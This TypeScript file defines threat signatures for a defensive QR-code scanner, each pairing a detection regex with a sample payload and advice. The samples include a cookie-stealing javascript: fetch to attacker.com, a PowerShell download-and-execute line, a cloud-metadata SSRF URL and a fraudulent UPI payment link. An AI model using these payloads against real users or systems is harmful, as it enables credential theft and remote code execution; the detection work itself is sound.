import { IndicatorSeverity, PayloadType, ThreatSignatureMatch } from '../types/security';

/**
 * THREAT SIGNATURE DEFINITION
 * Direct implementation of the official PDF guide:
 * "QR Code Threat Signatures & Training Guide: A practical, defensive reference for building
 * a QR scanner that explains risk, checks destinations, and avoids false confidence."
 *
 * Source: /public/assets/aistudio/QR_Code_Threat_Signatures_and_Training_Guide_6ae9500e.pdf
 */
export interface ThreatSignatureDefinition {
  id: string;
  category: string;
  name: string;
  severity: IndicatorSeverity;
  pdfSection: string;
  description: string;
  detectionRule: string;
  samplePayload: string;
  consequence: string;
  defensiveAction: string;
  matcher: (rawPayload: string, payloadType: PayloadType, parsedContext?: any) => {
    matched: boolean;
    evidence?: string;
    confidence?: 'confirmed' | 'high' | 'medium';
  };
}

/**
 * Brand allow-list & protected brand stems for homoglyph & mismatch detection
 * as recommended in Section 3 of the Guide.
 */
const PROTECTED_BRANDS = [
  'google', 'microsoft', 'apple', 'paypal', 'amazon', 'netflix', 'facebook',
  'instagram', 'whatsapp', 'telegram', 'github', 'chase', 'wellsfargo',
  'bankofamerica', 'citibank', 'sbi', 'hdfc', 'icici', 'axis', 'paytm'
];

/**
 * 16 THREAT TAXONOMY CATEGORIES directly from Guide Section 2:
 */
export const THREAT_SIGNATURE_CATALOGUE: ThreatSignatureDefinition[] = [
  // ==========================================
  // 1. MALWARE DELIVERY (Section 2 & 3)
  // ==========================================
  {
    id: 'SIG-MAL-APK-DIRECT',
    category: 'Malware Delivery',
    name: 'Direct Android APK Download Payload',
    severity: 'CRITICAL',
    pdfSection: 'Section 2 & 3: Malware Delivery & Download Indicators',
    description: 'QR destination points directly to an unverified Android Package (.apk) file outside official app stores, capable of sideloading spyware, trojans, or banking malware.',
    detectionRule: 'Detects .apk file extensions, MIME-type apk indicators, or direct Android package query params.',
    samplePayload: 'https://security-update-center.org/files/patch_2026_release.apk',
    consequence: 'Bypasses Google Play Protect scanning; can install overlay spyware, SMS forwarders, or RATs granting full device control.',
    defensiveAction: 'Do not tap Install. Never sideload APKs from QR codes. Only install apps from verified stores like Google Play.',
    matcher: (rawPayload) => {
      const lower = rawPayload.toLowerCase();
      const hasApk = /\.apk(\?|$|#)/i.test(lower) || /download.*\.apk/i.test(lower) || /mime=application\/vnd\.android\.package-archive/i.test(lower);
      if (hasApk) {
        return {
          matched: true,
          evidence: `Direct Android package file detected in destination URL: "${lower.match(/[^/?#]+\.apk/i)?.[0] || '.apk payload'}"`,
          confidence: 'confirmed',
        };
      }
      return { matched: false };
    },
  },
  {
    id: 'SIG-MAL-EXEC-PAYLOAD',
    category: 'Malware Delivery',
    name: 'Direct Executable / Script Payload (.exe, .msi, .bat, .dmg, .elf, .vbs)',
    severity: 'CRITICAL',
    pdfSection: 'Section 2 & 3: Download Indicators',
    description: 'QR points to an executable, installer, or script binary intended to execute commands on desktop or embedded operating systems.',
    detectionRule: 'Matches file extension indicators: .exe, .msi, .bat, .cmd, .ps1, .vbs, .dmg, .pkg, .elf, .iso, .sh, .scr.',
    samplePayload: 'https://cdn-billing-docs.info/invoices/Invoice_Oct2026.exe',
    consequence: 'Direct code execution; can install ransomware, keyloggers, or reverse-shell listeners on the device.',
    defensiveAction: 'Do not download or run this file. Discard immediately and inspect the sender origin.',
    matcher: (rawPayload) => {
      const match = rawPayload.match(/\.(exe|msi|bat|cmd|ps1|vbs|dmg|pkg|elf|iso|sh|scr)(\?|$|#)/i);
      if (match) {
        return {
          matched: true,
          evidence: `Direct executable/script extension detected: ".${match[1].toLowerCase()}"`,
          confidence: 'confirmed',
        };
      }
      return { matched: false };
    },
  },
  {
    id: 'SIG-MAL-MOBILE-PROFILE',
    category: 'Malware Delivery',
    name: 'Mobile Device Management / Provisioning Profile Lure (.mobileconfig)',
    severity: 'CRITICAL',
    pdfSection: 'Section 2 & 3: Mobile Device Management & Profile Download',
    description: 'Attempts to push an iOS mobile configuration profile or enterprise enrollment token that can install root CA certificates or redirect all traffic.',
    detectionRule: 'Matches .mobileconfig, .provisionprofile, or /mdm/enrollment paths.',
    samplePayload: 'https://free-wifi-login.net/profiles/corporate_vpn_config.mobileconfig',
    consequence: 'Can inspect encrypted HTTPS traffic via custom root CA certificates and reroute DNS to adversary servers.',
    defensiveAction: 'Cancel profile installation immediately. Never install configuration profiles from public QR codes.',
    matcher: (rawPayload) => {
      if (/\.(mobileconfig|provisionprofile)(\?|$|#)/i.test(rawPayload) || /\/mdm\/(enroll|provision)/i.test(rawPayload)) {
        return {
          matched: true,
          evidence: 'Device Configuration / Root CA profile download detected (.mobileconfig)',
          confidence: 'confirmed',
        };
      }
      return { matched: false };
    },
  },
  {
    id: 'SIG-MAL-ARCHIVE-LURE',
    category: 'Malware Delivery',
    name: 'Compressed Archive Containing Suspicious Payload (.zip, .rar, .7z)',
    severity: 'HIGH',
    pdfSection: 'Section 3: Download Indicators & File Types',
    description: 'QR directs to a compressed archive file frequently used to conceal nested malicious scripts and evade rudimentary file scanners.',
    detectionRule: 'Matches .zip, .rar, .7z, .tar.gz with keywords such as invoice, update, receipt, or patch.',
    samplePayload: 'https://fileshare-portal.site/urgent_tax_refund_docs.zip',
    consequence: 'May contain obfuscated batch scripts, macros, or trojans designed to execute upon archive extraction.',
    defensiveAction: 'Do not extract the archive. Submit for sandbox inspection if verification is required.',
    matcher: (rawPayload) => {
      const lower = rawPayload.toLowerCase();
      if (/\.(zip|rar|7z|tar\.gz|gz|cab)(\?|$|#)/i.test(lower) && /(urgent|invoice|refund|patch|update|order|tax|payment)/i.test(lower)) {
        return {
          matched: true,
          evidence: `Suspicious archive lure detected: "${lower.match(/[^/?#]+\.(zip|rar|7z|tar\.gz)/i)?.[0]}"`,
          confidence: 'high',
        };
      }
      return { matched: false };
    },
  },
  {
    id: 'SIG-MAL-DYNAMIC-STAGING',
    category: 'Malware Delivery',
    name: 'Dynamic DNS / Free Tunnel Staging Host (ngrok, trycloudflare, duckdns)',
    severity: 'HIGH',
    pdfSection: 'Section 3: Low-Reputation / Dynamic Hosts',
    description: 'Uses ephemeral public tunneling or dynamic DNS services commonly abused by attackers for short-lived malware drop-points and C2 listeners.',
    detectionRule: 'Matches ngrok-free.app, trycloudflare.com, duckdns.org, serveo.net, or localtunnel.me hosting downloads.',
    samplePayload: 'https://9a41-203-0-113-42.ngrok-free.app/malicious_payload.bin',
    consequence: 'Ephemeral server infrastructure prevents auditability and bypasses traditional IP-reputation blocklists.',
    defensiveAction: 'Do not trust ephemeral tunnel links in public settings or unexpected communications.',
    matcher: (rawPayload) => {
      const match = rawPayload.match(/(ngrok-free\.app|trycloudflare\.com|duckdns\.org|serveo\.net|localtunnel\.me|hopto\.org|zapto\.org)/i);
      if (match) {
        return {
          matched: true,
          evidence: `Dynamic tunnel/DDNS hosting domain detected: "${match[1]}"`,
          confidence: 'high',
        };
      }
      return { matched: false };
    },
  },

  // ==========================================
  // 2. PHISHING / QUISHING (Section 2 & 3)
  // ==========================================
  {
    id: 'SIG-PHISH-HOMOGLYPH',
    category: 'Phishing / Quishing',
    name: 'IDN Punycode Homoglyph Domain Impersonation',
    severity: 'CRITICAL',
    pdfSection: 'Section 2 & 3: Lookalike / IDN Homograph & Punycode',
    description: 'Uses internationalized domain names (Punycode xn--) containing lookalike Cyrillic or Greek glyphs that visually imitate reputable brands.',
    detectionRule: 'Detects xn-- punycode prefixes in domain names mimicking protected commercial or financial brands.',
    samplePayload: 'https://xn--appl-43d.com/secure/login',
    consequence: 'Tricks the user into submitting sensitive credentials or credit card numbers to a visually indistinguishable clone.',
    defensiveAction: 'Look at the actual punycode domain representation. Do not enter credentials on lookalike domains.',
    matcher: (rawPayload) => {
      try {
        const url = new URL(rawPayload);
        if (url.hostname.toLowerCase().includes('xn--')) {
          return {
            matched: true,
            evidence: `Internationalized Domain Name (Punycode) detected: "${url.hostname}"`,
            confidence: 'confirmed',
          };
        }
      } catch {}
      return { matched: false };
    },
  },
  {
    id: 'SIG-PHISH-BRAND-MISMATCH',
    category: 'Phishing / Quishing',
    name: 'Brand Stolen Subdomain / Deceptive Path Squatting',
    severity: 'HIGH',
    pdfSection: 'Section 2 & 3: Brand & Context Mismatch',
    description: 'Injects reputable brand keywords (e.g. google, paypal, apple, microsoft) into subdomains or paths while the registrable domain belongs to an unrelated third party.',
    detectionRule: 'Identifies brand names in hostname labels that do not match the official registrable root domain.',
    samplePayload: 'https://paypal.com.customer-support-portal.net/verify-account',
    consequence: 'Victims assume they are communicating with the genuine service and provide credentials, OTPs, or financial secrets.',
    defensiveAction: 'Inspect the rightmost domain name suffix. The real domain is not the brand mentioned in the prefix.',
    matcher: (rawPayload) => {
      try {
        const url = new URL(rawPayload);
        const host = url.hostname.toLowerCase();
        for (const brand of PROTECTED_BRANDS) {
          if (host.includes(brand)) {
            // Check if it's the genuine domain
            const isOfficial = host === `${brand}.com` || host.endsWith(`.${brand}.com`) ||
                               host === `${brand}.in` || host.endsWith(`.${brand}.in`) ||
                               host === `${brand}.org` || host.endsWith(`.${brand}.org`);
            if (!isOfficial) {
              return {
                matched: true,
                evidence: `Protected brand keyword "${brand}" appears in deceptive host "${host}"`,
                confidence: 'high',
              };
            }
          }
        }
      } catch {}
      return { matched: false };
    },
  },
  {
    id: 'SIG-PHISH-AUTH-LURE',
    category: 'Phishing / Quishing',
    name: 'Credential Harvesting Path & Query Token Lure',
    severity: 'HIGH',
    pdfSection: 'Section 3: Path / Query Semantics',
    description: 'Combines urgent security warning triggers with credential harvesting endpoints such as /verify-login, /reset-password, or /kyc-update.',
    detectionRule: 'Matches authentication/verification path tokens paired with suspension/warning queries.',
    samplePayload: 'https://secure-auth-node82.com/auth/login?action=verify_identity&status=suspended',
    consequence: 'Direct theft of user passwords, recovery keys, and multi-factor authentication codes.',
    defensiveAction: 'Navigate to the service directly by typing its known address or using the official application.',
    matcher: (rawPayload) => {
      const lower = rawPayload.toLowerCase();
      const hasAuthPath = /(login|signin|auth|verify|account|wallet|kyc|passcode)/i.test(lower);
      const hasUrgentQuery = /(suspended|urgent|immediate|security-alert|action-required|unauthorized|blocked)/i.test(lower);
      if (hasAuthPath && hasUrgentQuery) {
        return {
          matched: true,
          evidence: 'Credential harvesting path token combined with high-urgency account suspension parameter',
          confidence: 'high',
        };
      }
      return { matched: false };
    },
  },

  // ==========================================
  // 3. CREDENTIAL & SESSION THEFT (Section 2)
  // ==========================================
  {
    id: 'SIG-CRED-OTP-STEAL',
    category: 'Credential / Session Theft',
    name: 'Explicit One-Time Password (OTP) / Recovery Harvesting Pattern',
    severity: 'CRITICAL',
    pdfSection: 'Section 2: Credential / Session Theft',
    description: 'QR destination requests one-time passcodes, seed phrases, PINs, or recovery codes through web forms or pre-filled parameters.',
    detectionRule: 'Matches query or path containing otp=, 2fa=, seed=, pin=, passcode=, recovery_key=.',
    samplePayload: 'https://central-bank-portal.cc/portal/enter_otp.php?session_id=9831&prompt=enter_sms_otp',
    consequence: 'Adversary executes real-time session hijacking or completes unauthorized banking fund transfers.',
    defensiveAction: 'Never provide SMS OTPs, Authenticator codes, or bank PINs on web pages reached via QR codes.',
    matcher: (rawPayload) => {
      const lower = rawPayload.toLowerCase();
      if (/(enter_otp|sms_otp|verify_otp|seed_phrase|private_key|enter_pin|card_cvv)/i.test(lower)) {
        return {
          matched: true,
          evidence: 'Explicit OTP / PIN / Recovery secret parameter detected in payload',
          confidence: 'confirmed',
        };
      }
      return { matched: false };
    },
  },

  // ==========================================
  // 4. PAYMENT & QR REPLACEMENT FRAUD (Section 2 & 3)
  // ==========================================
  {
    id: 'SIG-PAY-REPLACEMENT-LURE',
    category: 'Payment / QR Replacement Fraud',
    name: 'Deceptive Payment / UPI Payee Impersonation',
    severity: 'CRITICAL',
    pdfSection: 'Section 2 & 8: Payment / QR Replacement Fraud',
    description: 'Replaces legitimate merchant payment details with fraudulent receiver credentials, or uses deceptive refund/rebate payee labels to deceive payers.',
    detectionRule: 'Matches upi://pay schemes with deceptive payee names (e.g. Refund, CashBack, Officer, Helpdesk) or abnormally high prefilled amounts.',
    samplePayload: 'upi://pay?pa=refund-desk-nodal@okaxis&pn=Electricity_Refund_Department&am=4999&cu=INR&tn=Immediate_Security_Refund',
    consequence: 'Direct financial theft. The victim believes they are receiving a refund or paying a utility bill, but funds are transferred to the fraudster.',
    defensiveAction: 'Stop payment. In UPI, receiving money NEVER requires entering your UPI PIN or scanning a QR code.',
    matcher: (rawPayload) => {
      if (rawPayload.startsWith('upi://pay')) {
        const lower = rawPayload.toLowerCase();
        if (/(refund|cashback|bonus|lottery|tax-dept|claim|reward|officer)/i.test(lower)) {
          return {
            matched: true,
            evidence: 'Deceptive payee description lure (Refund/CashBack/Officer) detected in UPI payment parameters',
            confidence: 'confirmed',
          };
        }
      }
      return { matched: false };
    },
  },

  // ==========================================
  // 5. REDIRECT CHAIN & CLOAKING (Section 2 & 3)
  // ==========================================
  {
    id: 'SIG-REDIR-SSRF-INTERNAL',
    category: 'Redirect Chain / Cloaking',
    name: 'Private Network / SSRF IP-Literal Target (RFC 1918 / Link-Local)',
    severity: 'CRITICAL',
    pdfSection: 'Section 3: Domain Structure & SSRF Protection',
    description: 'Attempts to force scanners or connected browsers to request private internal network addresses, routers, or cloud metadata endpoints.',
    detectionRule: 'Matches loopback (127.0.0.1, localhost), private IP ranges (10.x.x.x, 172.16-31.x.x, 192.168.x.x), or AWS metadata (169.254.169.254).',
    samplePayload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    consequence: 'Server-Side Request Forgery (SSRF); unauthorized access to local Wi-Fi router admin panels or cloud infrastructure credentials.',
    defensiveAction: 'Hard block. Scanners must never resolve or forward requests to private internal IP addresses.',
    matcher: (rawPayload) => {
      try {
        const url = new URL(rawPayload);
        const h = url.hostname;
        if (
          h === 'localhost' ||
          h === '127.0.0.1' ||
          h === '169.254.169.254' ||
          /^10\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(h) ||
          /^192\.168\.\d{1,3}\.\d{1,3}$/.test(h) ||
          /^172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}$/.test(h) ||
          h.startsWith('[::1]') ||
          h.startsWith('[fe80:')
        ) {
          return {
            matched: true,
            evidence: `Private / link-local / loopback IP literal target detected: "${h}"`,
            confidence: 'confirmed',
          };
        }
      } catch {}
      return { matched: false };
    },
  },
  {
    id: 'SIG-REDIR-AUTH-SPOOF',
    category: 'Redirect Chain / Cloaking',
    name: 'URL UserInfo Authority Spoofing (@ Symbol Deception)',
    severity: 'HIGH',
    pdfSection: 'Section 3: URL Obfuscation & Authority Parsing',
    description: 'Exploits URL parsing behavior using an "@" symbol in the authority component to make users believe they are visiting a trusted domain.',
    detectionRule: 'Detects presence of @ in the URL authority before the true hostname.',
    samplePayload: 'https://google.com@evil-phishing-host.com/login',
    consequence: 'Users see "google.com" in the link prefix and falsely believe it is safe, while the browser navigates to "evil-phishing-host.com".',
    defensiveAction: 'Do not trust URLs containing "@" before the hostname. Look at the actual destination host.',
    matcher: (rawPayload) => {
      try {
        if (/https?:\/\/[^/]*@[^/]+/i.test(rawPayload)) {
          return {
            matched: true,
            evidence: 'UserInfo authority spoofing (@ symbol before destination hostname) detected',
            confidence: 'confirmed',
          };
        }
      } catch {}
      return { matched: false };
    },
  },
  {
    id: 'SIG-REDIR-CLOAKING-SHORT',
    category: 'Redirect Chain / Cloaking',
    name: 'Opaque URL Shortener / Redirect Cloaking Hop',
    severity: 'MEDIUM',
    pdfSection: 'Section 2 & 3: Shorteners / Redirects',
    description: 'Hides the final landing page and infrastructure behind an unvetted public URL shortening service.',
    detectionRule: 'Matches known URL shorteners (bit.ly, tinyurl.com, is.gd, t.co, rebrand.ly, rb.gy, ow.ly, cutt.ly).',
    samplePayload: 'https://tinyurl.com/urgent-security-patch',
    consequence: 'Prevents preliminary visual inspection of the actual destination domain before opening.',
    defensiveAction: 'Preview the expanded destination in a safe sandbox before proceeding.',
    matcher: (rawPayload) => {
      try {
        const url = new URL(rawPayload);
        const h = url.hostname.toLowerCase();
        const shorteners = ['bit.ly', 'tinyurl.com', 'is.gd', 't.co', 'rebrand.ly', 'rb.gy', 'ow.ly', 'cutt.ly', 'shorte.st'];
        if (shorteners.some((s) => h === s || h.endsWith(`.${s}`))) {
          return {
            matched: true,
            evidence: `URL shortener detected: "${h}" masks the real final destination`,
            confidence: 'high',
          };
        }
      } catch {}
      return { matched: false };
    },
  },

  // ==========================================
  // 6. DEEP-LINK / APP ACTION ABUSE (Section 2 & 3)
  // ==========================================
  {
    id: 'SIG-DEEP-INTENT-HIJACK',
    category: 'Deep-Link / App Action Abuse',
    name: 'Android Intent URI Package Launch Abuse',
    severity: 'CRITICAL',
    pdfSection: 'Section 2 & 3: Deep-Link / App Action Abuse',
    description: 'Uses Android intent schemes (intent://...#Intent;) to trigger internal application activities or force installation of unknown packages.',
    detectionRule: 'Detects intent:// scheme payloads containing package=, action=, or component= attributes.',
    samplePayload: 'intent://run_update#Intent;scheme=package;package=com.unknown.spyware;end',
    consequence: 'Can launch sensitive device components, bypass permission prompts, or trigger unconfirmed background operations.',
    defensiveAction: 'Blocked by default. Never execute Android intent URIs from unverified QR codes.',
    matcher: (rawPayload) => {
      if (rawPayload.startsWith('intent:') || rawPayload.includes('#Intent;')) {
        return {
          matched: true,
          evidence: 'Android Intent scheme URI (#Intent;) detected attempting to execute package actions',
          confidence: 'confirmed',
        };
      }
      return { matched: false };
    },
  },
  {
    id: 'SIG-DEEP-ARBITRARY-SCHEME',
    category: 'Deep-Link / App Action Abuse',
    name: 'Dangerous Script / Protocol Scheme (javascript:, data:, file:, blob:)',
    severity: 'CRITICAL',
    pdfSection: 'Section 3: Scheme / Protocol Handling',
    description: 'Contains dangerous non-HTTP URI schemes designed to execute script code directly inside vulnerable webview contexts or access local files.',
    detectionRule: 'Matches javascript:, data:, file:, blob:, vbscript:, or mhtml: URI schemes.',
    samplePayload: 'javascript:fetch("https://attacker.com/steal?c="+document.cookie)',
    consequence: 'Cross-Site Scripting (XSS), local storage token exfiltration, or access to local filesystem assets.',
    defensiveAction: 'Execution strictly forbidden. This payload contains executable browser scripting.',
    matcher: (rawPayload) => {
      const lower = rawPayload.trim().toLowerCase();
      const match = lower.match(/^(javascript:|data:|file:|blob:|vbscript:|mhtml:)/);
      if (match) {
        return {
          matched: true,
          evidence: `Dangerous execution protocol scheme detected: "${match[1]}"`,
          confidence: 'confirmed',
        };
      }
      return { matched: false };
    },
  },
  {
    id: 'SIG-DEEP-UNCONFIRMED-TELEPHONY',
    category: 'Deep-Link / App Action Abuse',
    name: 'Telephony / MMI / USSD / Premium SMS Trigger',
    severity: 'HIGH',
    pdfSection: 'Section 2 & 3: Contact / Message Abuse & Telephony',
    description: 'Prepares an automated phone call or SMS message targeting carrier MMI codes (*21* call-forwarding), premium rate numbers, or sensitive keyword replies.',
    detectionRule: 'Detects tel: or smsto: with USSD prefixes (*#), call forwarding codes, or premium rate destination prefixes.',
    samplePayload: 'tel:*21*9876543210#',
    consequence: 'Unconditional call forwarding reroutes incoming 2FA verification calls to the attacker; unexpected carrier billing fees.',
    defensiveAction: 'Do not dial this code. Check your carrier call forwarding settings immediately.',
    matcher: (rawPayload) => {
      const lower = rawPayload.toLowerCase();
      if (lower.startsWith('tel:') && /(\*|\#|%23)/.test(lower)) {
        return {
          matched: true,
          evidence: `USSD / MMI / Call forwarding command detected in dialer URI: "${rawPayload}"`,
          confidence: 'confirmed',
        };
      }
      return { matched: false };
    },
  },

  // ==========================================
  // 7. WI-FI CONFIGURATION ABUSE (Section 2 & 3)
  // ==========================================
  {
    id: 'SIG-WIFI-ROGUE-OPEN',
    category: 'Wi-Fi Configuration Abuse',
    name: 'Rogue / Open Wi-Fi Network Impersonation',
    severity: 'HIGH',
    pdfSection: 'Section 2: Wi-Fi Configuration Abuse',
    description: 'Configures connection to an unencrypted (open) wireless network imitating legitimate public venues (airports, hotels, banks).',
    detectionRule: 'Matches WIFI: payloads with T:nopass; and high-trust SSID keywords (Airport, Hotel, Guest, Free, Bank).',
    samplePayload: 'WIFI:S:Airport_Free_HighSpeed_WiFi;T:nopass;;',
    consequence: 'Man-in-the-Middle (MitM) eavesdropping; DNS spoofing; captive portal credential harvesting on unencrypted traffic.',
    defensiveAction: 'Do not auto-join open networks. Always use a verified cellular connection or trusted VPN in public spaces.',
    matcher: (rawPayload) => {
      if (rawPayload.startsWith('WIFI:')) {
        const lower = rawPayload.toLowerCase();
        const isOpen = lower.includes('t:nopass') || lower.includes('t:none') || !lower.includes('p:');
        const hasLure = /(airport|hotel|guest|free|bank|starbucks|metro)/i.test(lower);
        if (isOpen && hasLure) {
          return {
            matched: true,
            evidence: 'Unencrypted (open) Wi-Fi payload impersonating a public trusted venue',
            confidence: 'confirmed',
          };
        }
      }
      return { matched: false };
    },
  },
  {
    id: 'SIG-WIFI-WEAK-ENCRYPTION',
    category: 'Wi-Fi Configuration Abuse',
    name: 'Obsolete / Weak WEP Wi-Fi Encryption',
    severity: 'MEDIUM',
    pdfSection: 'Section 2: Wi-Fi Configuration Abuse',
    description: 'Specifies obsolete WEP encryption that can be cracked cryptographically within minutes.',
    detectionRule: 'Matches WIFI: payloads specifying T:WEP;.',
    samplePayload: 'WIFI:S:Legacy_Office_Net;T:WEP;P:1234567890;;',
    consequence: 'Keystream recovery allows eavesdroppers to decrypt all wireless frames in transit.',
    defensiveAction: 'Do not connect. Migrate the router to WPA2-AES or WPA3 security standards.',
    matcher: (rawPayload) => {
      if (rawPayload.startsWith('WIFI:') && /T:WEP;/i.test(rawPayload)) {
        return {
          matched: true,
          evidence: 'Deprecated, cryptographically broken WEP encryption specified in Wi-Fi payload',
          confidence: 'confirmed',
        };
      }
      return { matched: false };
    },
  },

  // ==========================================
  // 8. PLAIN-TEXT SOCIAL ENGINEERING (Section 2 & 3)
  // ==========================================
  {
    id: 'SIG-ENG-URGENT-DEMAND',
    category: 'Plain-Text Social Engineering',
    name: 'Emergency Account Action & Security Disabling Demand',
    severity: 'HIGH',
    pdfSection: 'Section 2 & 3: Plain-Text Social Engineering',
    description: 'Encodes deceptive urgent text demanding immediate cryptocurrency transfer, OTP submission, or disabling of device protections (Play Protect).',
    detectionRule: 'Detects urgent countdown language ("within 2 hours", "account suspended") paired with payment or security bypass instructions.',
    samplePayload: 'URGENT: Your bank account will be suspended within 2 hours. Disable Google Play Protect and send 0.05 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa to restore access.',
    consequence: 'Social engineering psychological coercion to cause impulsive financial loss or disable device security layers.',
    defensiveAction: 'Do not follow these instructions. Official organizations will never ask you to disable security protections or pay in crypto.',
    matcher: (rawPayload, payloadType) => {
      if (payloadType === 'PLAIN_TEXT' || !rawPayload.includes('://')) {
        const lower = rawPayload.toLowerCase();
        const hasUrgency = /(within \d+ hours|account will be (suspended|blocked|terminated)|immediate action required)/i.test(lower);
        const hasSecurityBypassOrCrypto = /(disable (google )?play protect|bypass security|send (bitcoin|btc|usdt)|wire transfer|give your otp)/i.test(lower);
        if (hasUrgency || hasSecurityBypassOrCrypto) {
          return {
            matched: true,
            evidence: 'Social engineering urgency lure demanding security bypass or emergency transfer',
            confidence: 'high',
          };
        }
      }
      return { matched: false };
    },
  },
  {
    id: 'SIG-ENG-CLI-INJECTION',
    category: 'Plain-Text Social Engineering',
    name: 'Disguised Terminal / PowerShell Command Injection',
    severity: 'CRITICAL',
    pdfSection: 'Section 2: Plain-Text Social Engineering & Encoded Commands',
    description: 'Encodes bash, powershell, or cmd command strings disguised as innocent diagnostic text or verification tokens.',
    detectionRule: 'Detects shell commands (curl | bash, powershell -enc, certutil -urlcache, wget -qO-).',
    samplePayload: 'powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://bad.com/a.ps1\'))"',
    consequence: 'Silent execution of remote access trojans (RATs) if copied into an administrative terminal.',
    defensiveAction: 'Never copy or run text strings from unknown QR codes into your terminal, PowerShell, or Run dialog.',
    matcher: (rawPayload) => {
      const lower = rawPayload.toLowerCase();
      if (
        /(powershell.*-e|powershell.*-nop|curl.*\|\s*bash|wget.*-qo-.*\|\s*sh|certutil.*-urlcache|cmd\.exe\s*\/c)/i.test(lower)
      ) {
        return {
          matched: true,
          evidence: 'Terminal / PowerShell command invocation string detected in payload text',
          confidence: 'confirmed',
        };
      }
      return { matched: false };
    },
  },

  // ==========================================
  // 9. FAKE TECH SUPPORT / ALARMIST SCAMS (Section 2)
  // ==========================================
  {
    id: 'SIG-SCAM-TECH-SUPPORT',
    category: 'Fake Support / Tech-Support Scam',
    name: 'Alarmist Device Infection / Remote Access Software Lure',
    severity: 'HIGH',
    pdfSection: 'Section 2: Fake Support / Tech-Support Scam',
    description: 'Presents deceptive virus alerts claiming the device is severely infected and instructs the user to call an unverified helpline or install remote software.',
    detectionRule: 'Matches keywords such as "virus detected", "call support", "anydesk", "teamviewer" in suspicious contexts.',
    samplePayload: 'https://security-alert-center04.top/warning?msg=VIRUS_DETECTED_CALL_1800_HELP',
    consequence: 'Scammers charge hundreds of dollars for nonexistent repairs and steal banking credentials via remote desktop tools.',
    defensiveAction: 'Close the browser tab. Legitimate operating systems never display phone numbers in browser alerts.',
    matcher: (rawPayload) => {
      const lower = rawPayload.toLowerCase();
      if (
        /(virus.detected|call.support|infected|trojan.alert|tollfree|anydesk|teamviewer|quicksupport)/i.test(lower) &&
        /(warning|alert|helpline|support)/i.test(lower)
      ) {
        return {
          matched: true,
          evidence: 'Deceptive tech-support scareware keywords detected',
          confidence: 'high',
        };
      }
      return { matched: false };
    },
  },

  // ==========================================
  // 10. UNWANTED SOFTWARE / PUA (Section 2)
  // ==========================================
  {
    id: 'SIG-PUA-DECEPTIVE-INSTALLER',
    category: 'Unwanted Software / PUA',
    name: 'Deceptive Browser / Codec / Driver Updater Lure',
    severity: 'HIGH',
    pdfSection: 'Section 2: Unwanted Software / PUA',
    description: 'Fabricates missing media player codecs, browser updates, or driver patches to push Potentially Unwanted Applications (PUA) or adware bundles.',
    detectionRule: 'Matches update/codec lure tokens: update_flash, chrome_patch, video_codec_update.',
    samplePayload: 'https://streaming-media-center.tv/download/chrome_update_installer.exe',
    consequence: 'Injects persistent adware, hijacks search engines, or installs crypto-mining background services.',
    defensiveAction: 'Only update your operating system and browsers through their built-in Settings menus.',
    matcher: (rawPayload) => {
      const lower = rawPayload.toLowerCase();
      if (
        /(flash.*update|chrome.*update|codec.*install|driver.*patch|speedup.*cleaner)/i.test(lower) &&
        /\.(exe|apk|dmg|msi|zip)/i.test(lower)
      ) {
        return {
          matched: true,
          evidence: 'Deceptive software updater / codec installer bundle detected',
          confidence: 'high',
        };
      }
      return { matched: false };
    },
  },
];

/**
 * Evaluates all threat signatures against a given QR payload.
 * Returns an array of matched signatures with concrete evidence.
 */
export function matchThreatSignatures(
  rawPayload: string,
  payloadType: PayloadType,
  parsedContext?: any
): ThreatSignatureMatch[] {
  const matches: ThreatSignatureMatch[] = [];

  for (const sig of THREAT_SIGNATURE_CATALOGUE) {
    try {
      const result = sig.matcher(rawPayload, payloadType, parsedContext);
      if (result.matched) {
        matches.push({
          id: sig.id,
          category: sig.category,
          name: sig.name,
          severity: sig.severity,
          pdfSection: sig.pdfSection,
          evidence: result.evidence || sig.description,
          confidence: result.confidence || 'high',
          consequence: sig.consequence,
          defensiveAction: sig.defensiveAction,
        });
      }
    } catch (err) {
      console.warn(`Error evaluating threat signature ${sig.id}:`, err);
    }
  }

  return matches;
}

/**
 * Returns summary statistics for signature evaluation
 */
export function getSignatureSummary(matches: ThreatSignatureMatch[]) {
  const total = matches.length;
  const critical = matches.filter((m) => m.severity === 'CRITICAL').length;
  const high = matches.filter((m) => m.severity === 'HIGH').length;
  const medium = matches.filter((m) => m.severity === 'MEDIUM').length;

  let maxSeverity: IndicatorSeverity = 'INFO';
  if (critical > 0) maxSeverity = 'CRITICAL';
  else if (high > 0) maxSeverity = 'HIGH';
  else if (medium > 0) maxSeverity = 'MEDIUM';
  else if (total > 0) maxSeverity = 'LOW';

  return {
    total,
    critical,
    high,
    medium,
    maxSeverity,
    categories: Array.from(new Set(matches.map((m) => m.category))),
  };
}
